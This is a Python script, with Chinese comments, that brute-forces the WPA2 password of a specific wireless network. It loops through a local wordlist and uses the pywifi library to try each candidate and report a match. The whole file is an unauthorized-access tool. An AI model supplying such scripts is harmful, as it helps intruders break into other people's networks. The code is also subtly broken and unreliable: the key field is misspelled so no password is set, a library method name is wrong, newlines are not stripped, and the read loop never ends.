import pywifi
from pywifi import const
import time

#导入模块
#抓取接口
#断开所有wifi
#读取wifi密码
#设置睡眠时间


def wificontect(password):
    wifi=pywifi.PyWiFi()
    ifaces=wifi.interface()[0]
    print(ifaces)
    #断开所有的wifi
    ifaces.disconnect()
    time.sleep(1)
    wifistatus=ifaces.status()
    if wifistatus==const.IFACE_DISCONNECTED:
        profile=pywifi.profile()
        profile.ssid="TP-LINK_6B1B"
        #网卡的开放
        profile.auth=const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        #加密单元
        profile.cipher=const.CIPHER_TYPE_CCMP
        profile.kye=password
        #删除所有wifi
        ifaces.remove_all_network_profiles()
        tep_file=ifaces.add_network_profiles(profile)
        ifaces.connect(tep_file)
        time.sleep(4)
        if ifaces.status()==const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("已连接")


def reaPassword():
    print("开始破译：")
    path="D:\\Program Files\python\TestWifi\password.txt"

    file=open(path,"r")
    while True:
        try:
            passStr=file.readline()
            bool = wificontect(passStr)
            if bool:
                print("密码正确：",passStr)
            else:
                print("密码错误:",passStr)
        except:
            continue
reaPassword()
